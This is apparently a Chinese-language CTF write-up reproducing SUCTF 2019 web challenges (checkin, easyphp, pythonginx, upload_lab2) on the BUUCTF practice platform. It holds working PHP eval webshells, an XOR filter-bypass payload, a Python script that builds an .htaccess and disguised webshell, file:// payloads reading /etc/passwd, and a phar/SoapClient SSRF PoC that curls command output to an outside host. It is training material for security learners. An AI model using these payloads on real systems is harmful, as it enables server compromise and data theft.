# 前言
SUCTF复现一波.....

复现环境均来自于ＢＵＵＣＴＦ

# checkin

这道题我们主要使用`.user.ini`

payload:

```php
.user.ini
auto_prepend_file=test.gif
```

木马中检测`<?`

```php
test.gif
<script language='php'>eval($_POST['cmd']);</script>
```

然后用antsword连接，完事

```php
http://fbe7e73a-45ff-4c28-86c4-dd879cc61e8b.node2.buuoj.cn.wetolink.com/uploads/3f8c45add7e4722d7a34d2fea8c87504/index.php
```



# easyphp

这道题进去后，题目是给了源代码：

```php
 <?php
function get_the_flag(){
    // webadmin will remove your upload file every 20 min!!!! 
    $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
    if(!file_exists($userdir)){
    mkdir($userdir);
    }
    if(!empty($_FILES["file"])){
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_FILES["file"]["name"];
        $extension = substr($name, strrpos($name,".")+1);
    if(preg_match("/ph/i",$extension)) die("^_^"); 
        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");
    if(!exif_imagetype($tmp_name)) die("^_^"); 
        $path= $userdir."/".$name;
        @move_uploaded_file($tmp_name, $path);
        print_r($path);
    }
}

$hhh = @$_GET['_'];

if (!$hhh){
    highlight_file(__FILE__);
}

if(strlen($hhh)>18){
    die('One inch long, one inch strong!');
}

if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh) )
    die('Try something else!');

$character_type = count_chars($hhh, 3);
if(strlen($character_type)>12) die("Almost there!");

eval($hhh);
?>
```

代码执行漏洞。我们得通过`eval()`来执行到`get_the_flag()`

可是这里有三个限制

```php
//对长度的限制
if(strlen($hhh)>18){
    die('One inch long, one inch strong!');
}

//正则过滤
if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh) )
    die('Try something else!');
    
//字符类型数量的限制
$character_type = count_chars($hhh, 3);
if(strlen($character_type)>12) die("Almost there!");
```



我们先来解决正则匹配的问题

这里有个很好用的工具脚本，可以判断正则过滤了哪些字符

```php
<?php

$unfilter_str = array();

for ($ascii = 0; $ascii < 256; $ascii++) {

	if (!preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', chr($ascii))) {
		$unfilter_str[] = urlencode(chr($ascii));
	}
print_r('\'' . implode('\',\'', $unfilter_str) . '\'');
}
?>
```

这是fuzz的结果

```php
['%21','%23','%24','%25','%28','%29','%2A','%2B','-','%2F','%3A','%3B','%3C','%3E','%3F','%40','%5C','%5D','%5E','%7B','%7D','%80','%81','%82','%83','%84','%85','%86','%87','%88','%89','%8A','%8B','%8C','%8D','%8E','%8F','%90','%91','%92','%93','%94','%95','%96','%97','%98','%99','%9A','%9B','%9C','%9D','%9E','%9F','%A0','%A1','%A2','%A3','%A4','%A5','%A6','%A7','%A8','%A9','%AA','%AB','%AC','%AD','%AE','%AF','%B0','%B1','%B2','%B3','%B4','%B5','%B6','%B7','%B8','%B9','%BA','%BB','%BC','%BD','%BE','%BF','%C0','%C1','%C2','%C3','%C4','%C5','%C6','%C7','%C8','%C9','%CA','%CB','%CC','%CD','%CE','%CF','%D0','%D1','%D2','%D3','%D4','%D5','%D6','%D7','%D8','%D9','%DA','%DB','%DC','%DD','%DE','%DF','%E0','%E1','%E2','%E3','%E4','%E5','%E6','%E7','%E8','%E9','%EA','%EB','%EC','%ED','%EE','%EF','%F0','%F1','%F2','%F3','%F4','%F5','%F6','%F7','%F8','%F9','%FA','%FB','%FC','%FD','%FE','%FF']

```

直接上payload吧。

我们这里使用字符异或绕过

```python
str="_GET"
for i in str:
    print(hex(ord(i)))
```

这是获得我们所需字符的16进制的hash值。

```
hex(0x5f^0xff)
hex(0x47^0xff)
hex(0x45^0xff)
hex(0x54^0xff)
```

将其与`0xff`做异或处理并获取其hex值。

![](/home/cookie/Pictures/blogs/2019SUCTF[复现]/2.png)

构造payload如下

```php
?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo
```

![](/home/cookie/Pictures/blogs/2019SUCTF[复现]/3.png)

第一部分的最终payload为

```php
?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=get_the_flag
```



进入第二部分，调用了`get_the_flag`函数

上传文件，然后这里有三个限制

```php
    if(preg_match("/ph/i",$extension)) die("^_^"); 
    if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");
    if(!exif_imagetype($tmp_name)) die("^_^"); 
```

文件类型检验，后缀检验，内容中`<?`检验

我们使用`.htaccess`文件用来绕过后缀检验，然后文件内容使用`<scrpit language='php'></script>`绕过。

类型检验，我们把文件伪装成xbm文件

![](/home/cookie/Pictures/blogs/2019SUCTF[复现]/4.png)

最后附上exp

```python
SIZE_HEADER = b"\n\n#define width 1337\n#define height 1337\n\n"

def generate_php_file(filename, script):
    phpfile = open(filename, 'wb')

    phpfile.write(script.encode('utf-16be'))
    phpfile.write(SIZE_HEADER)

    phpfile.close()

def generate_htacess():
    htaccess = open('.htaccess', 'wb')

    htaccess.write(SIZE_HEADER)
    htaccess.write(b'AddType application/x-httpd-php .south\n')
    htaccess.write(b'php_value zend.multibyte 1\n')
    htaccess.write(b'php_value zend.detect_unicode 1\n')
    htaccess.write(b'php_value display_errors 1\n')

    htaccess.close()

generate_htacess()
generate_php_file("webshell.south", "<?php eval($_GET['cmd']); die(); ?>")
```

生成的文件上传就好了。



# pythonginx

给了代码

```python
@app.route('/getUrl', methods=['GET', 'POST'])
def getUrl():
    url = request.args.get("url")
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return "我扌 your problem? 111"
    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return "我扌 your problem? 222 " + host
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    #去掉 url 中的空格
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return urllib.request.urlopen(finalUrl).read()
    else:
        return "我扌 your problem? 333"
```

url中如果存在`suctf.cc`，那这个就会被ban掉，然后问题代码在

```python
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
```

字符编码问题，这个trick在2019年的black-hat上被提出来

![](/home/cookie/Pictures/blogs/2019SUCTF[复现]/5.png)

[2019black-hat-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)

所以我们通过特殊的编码绕过对域名的检验,编码来自于[https://en.wiktionary.org/wiki/Appendix:Unicode/Letterlike_Symbols](https://en.wiktionary.org/wiki/Appendix:Unicode/Letterlike_Symbols)

```
payload:
file://suctf.cℂ/../../../etc/passwd

提示中的nginx
payload2:
file://suctf.cℂ/../../../usr/local/nginx/conf/nginx.conf

payload3:
file://suctf.cℂ/usr/fffffflag
```



**分享另外一个解法，比预期解更像预期解的非预期解**

在题目给的源码中

```python
parts = list(urlsplit(url))
...
finalUrl = urlunsplit(parts).split(' ')[0]
```

这两个操作，实际上存在一个漏洞，可能被利用，我觉得可以学习一下

```python
from urllib.parse import urlsplit,urlunsplit,unquote
from urllib import parse

url = "http://www.baidu.com/flag.php"
parts = parse.urlsplit(url)
print(parts)
```

结果如下：

```python
SplitResult(scheme='http', netloc='www.baidu.com', path='/flag.php', query='', fragment='')
```

然而在`urlunsplit()`中有个缺陷，看一个这个函数的源码

```python
def urlunsplit(components):
    """Combine the elements of a tuple as returned by urlsplit() into a
    complete URL as a string. The data argument can be any five-item iterable.
    This may result in a slightly different, but equivalent URL, if the URL that
    was parsed originally had unnecessary delimiters (for example, a ? with an
    empty query; the RFC states that these are equivalent)."""
    scheme, netloc, url, query, fragment, _coerce_result = (
                                          _coerce_args(*components))
    if netloc or (scheme and scheme in uses_netloc and url[:2] != '//'):
        if url and url[:1] != '/': url = '/' + url
        url = '//' + (netloc or '') + url
    if scheme:
        url = scheme + ':' + url
    if query:
        url = url + '?' + query
    if fragment:
        url = url + '#' + fragment
    return _coerce_result(url)
```

这里就是将`urlspilt()`的结果重新拼接，但是问题在：

```python
url = '//' + (netloc or '') + url
```

如果我们给的netloc是空的，那么最后重新拼接的结果就不一样了,比如

```python
from urllib.parse import urlsplit,urlunsplit,unquote
from urllib import parse

url = "file:////flag.php"
parts = parse.urlsplit(url)
print(parts)

url2 = urlunsplit(parts)
parts2 = parse.urlsplit(url2)
print(parts2)
```

结果如下：

```python
SplitResult(scheme='file', netloc='', path='//flag.php', query='', fragment='')
SplitResult(scheme='file', netloc='flag.php', path='', query='', fragment='')
file://flag.php
```

成功绕过题目中的限制。

payload:

```python
file:////suctf.cc/../../../etc/passwd
```









# upload_lab2

这道题它给了源码，这道题按作者的思路来，这里的考点还蛮有意思的.

[SUCTF 2019 出题笔记 & phar 反序列化的一些拓展](https://xz.aliyun.com/t/6057#toc-6)

```php
#index.php
<?php
include 'class.php';

$userdir = "upload/" . md5($_SERVER["REMOTE_ADDR"]);
if (!file_exists($userdir)) {
    mkdir($userdir, 0777, true);
}
if (isset($_POST["upload"])) {
    // 允许上传的图片后缀
    $allowedExts = array("gif", "jpeg", "jpg", "png");
    $tmp_name = $_FILES["file"]["tmp_name"];
    $file_name = $_FILES["file"]["name"];
    $temp = explode(".", $file_name);
    $extension = end($temp);
    if ((($_FILES["file"]["type"] == "image/gif")
            || ($_FILES["file"]["type"] == "image/jpeg")
            || ($_FILES["file"]["type"] == "image/png"))
        && ($_FILES["file"]["size"] < 204800)   // 小于 200 kb
        && in_array($extension, $allowedExts)
    ) {
        $c = new Check($tmp_name);
        $c->check();
        if ($_FILES["file"]["error"] > 0) {
            echo "错误：: " . $_FILES["file"]["error"] . "<br>";
            die();
        } else {
            move_uploaded_file($tmp_name, $userdir . "/" . md5($file_name) . "." . $extension);
            echo "文件存储在: " . $userdir . "/" . md5($file_name) . "." . $extension;
        }
    } else {
        echo "非法的文件格式";
    }
}

#class.php
<?php
include 'config.php';

class File{

    public $file_name;
    public $type;
    public $func = "Check";

    function __construct($file_name){
        $this->file_name = $file_name;
    }

    function __wakeup(){
        $class = new ReflectionClass($this->func);
        $a = $class->newInstanceArgs($this->file_name);
        $a->check();
    }

    function getMIME(){
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $this->type = finfo_file($finfo, $this->file_name);
        finfo_close($finfo);
    }

    function __toString(){
        return $this->type;
    }

}

class Check{

    public $file_name;

    function __construct($file_name){
        $this->file_name = $file_name;
    }

    function check(){
        $data = file_get_contents($this->file_name);
        if (mb_strpos($data, "<?") !== FALSE) {
            die("&lt;? in contents!");
        }
    }
}

#func.php
<?php
include 'class.php';

if (isset($_POST["submit"]) && isset($_POST["url"])) {
    if(preg_match('/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i',$_POST['url'])){
        die("Go away!");
    }else{
        $file_path = $_POST['url'];
        $file = new File($file_path);
        $file->getMIME();
        echo "<p>Your file type is '$file' </p>";
    }
}

?>
      
#admin.php
    <?php
include 'config.php';

class Ad{

    public $ip;
    public $port;

    public $clazz;
    public $func1;
    public $func2;
    public $func3;
    public $instance;
    public $arg1;
    public $arg2;
    public $arg3;

    function __construct($ip, $port, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3){

        $this->ip = $ip;
        $this->port = $port;
        $this->clazz = $clazz;
        $this->func1 = $func1;
        $this->func2 = $func2;
        $this->func3 = $func3;
        $this->arg1 = $arg1;
        $this->arg2 = $arg2;
        $this->arg3 = $arg3;
    }

    function check(){

        $reflect = new ReflectionClass($this->clazz);
       
        $this->instance = $reflect->newInstanceArgs();

        $reflectionMethod = new ReflectionMethod($this->clazz, $this->func1);


        $reflectionMethod->invoke($this->instance, $this->arg1);
        $reflectionMethod = new ReflectionMethod($this->clazz, $this->func2);


        $reflectionMethod->invoke($this->instance, $this->arg2);
        

        $reflectionMethod = new ReflectionMethod($this->clazz, $this->func3);
        $reflectionMethod->invoke($this->instance, $this->arg3);
        
    }

    function __destruct(){
        system($this->cmd);
    }
}

if($_SERVER['REMOTE_ADDR'] == '127.0.0.1'){
    if(isset($_POST['admin'])){

        $ip = $_POST['ip'];     
        $port = $_POST['port']; 
        $clazz = $_POST['clazz'];
        $func1 = $_POST['func1'];
        $func2 = $_POST['func2'];
        $func3 = $_POST['func3'];
        $arg1 = $_POST['arg1'];
        $arg2 = $_POST['arg2'];
        $arg2 = $_POST['arg3'];
        $admin = new Ad($ip, $port, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);
        $admin->check();
    }
}
else {
    echo "You r not admin!";
}
```

代码审计部分，我们从`index.php`入手，这里使用白名单过滤，那么这里我们就只能上传图片文件，没有发现其他可以利用的地方。上传图片后，它会返回一个路径，这里就先搁着，看看其他文件......

看到`func.php`接受一个`url`,返回我们所上传的图片的文件类型。

```php
if (isset($_POST["submit"]) && isset($_POST["url"])) {
    if(preg_match('/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i',$_POST['url'])){
        die("Go away!");
    }else{
        $file_path = $_POST['url'];
        $file = new File($file_path);
        $file->getMIME();
        echo "<p>Your file type is '$file' </p>";
    }
}
```

跟进`getMIME()`函数

```php
    function getMIME(){
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $this->type = finfo_file($finfo, $this->file_name);
        finfo_close($finfo);
    }
```

这里的`finfo_file()`可以触发`phar反序列化漏洞`。

`getIMIME()`是File类的方法，在File类中有一个很可疑的方法，就是`__wakeup()`

```php
    function __wakeup(){
        $class = new ReflectionClass($this->func);
        $a = $class->newInstanceArgs($this->file_name);
        $a->check();
    }
```

考察ssrf的地方到了.....admin.php仅内网可访问，这里使用SoapClient类发起一个访问

```php
//admin.php    
    function __destruct(){
        system($this->cmd);
    }
```

这里可以带出flag。

附上POC

```php
<?php
class File{
    public $file_name;
    public $type;
    public $func = "SoapClient";
    function __construct($file_name){
        $this->file_name = $file_name;
    }
}
$target = 'http://127.0.0.1/admin.php';
// $target = "http://106.14.153.173:2015";
//$post_string = 'admin=1&&clazz=Mysqli&func1=init&arg1=&func2=real_connect&arg2[0]=xxx.xxx.xxx.xxx&arg2[1]=root&arg2[2]=123&arg2[3]=test&arg2[4]=3306&func3=query&arg3=select%201&ip=xxx.xxx.xxx.xxx&port=xxxx';
$post_string ='admin=1&cmd=curl http://6fe82b486986/`/readflag`&clazz=SplStack&func1=push&func2=push&func3=push&arg1=123456&arg2=123456&arg3=123456'. "\r\n";

$headers = array(
    'X-Forwarded-For: 127.0.0.1',
);
// $b = new SoapClient(null,array("location" => $target,"user_agent"=>"zedd\r\nContent-Type: application/x-www-form-urlencoded\r\n".join("\r\n",$headers)."\r\nContent-Length: ".(string)strlen($post_string)."\r\n\r\n".$post_string,"uri"      => "aaab"));
$arr = array(null, array("location" => $target,"user_agent"=>"zedd\r\nContent-Type: application/x-www-form-urlencoded\r\n".join("\r\n",$headers)."\r\nContent-Length: ".(string)strlen($post_string)."\r\n\r\n".$post_string,"uri"      => "aaab"));
$phar = new Phar("1.phar"); //后缀名必须为phar
$phar->startBuffering();
// <?php __HALT_COMPILER();
$phar->setStub("GIF89a" . "< language='php'>__HALT_COMPILER();</>"); //设置stub
$o = new File($arr);
$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test");
//签名自动计算
$phar->stopBuffering();
rename("1.phar", "9.gif");
?>
```

生成一个文件，上传后，为绕过其协议限制，我们使用php://filter伪协仪来绕过

```php
php://filter/read=convert.base64-encode/resource=phar://./upload/xxx.gif
```

复现是在BUUCTF中进行的，然后我们得使用这个平台提供的内网靶机，使用curl带出flag。











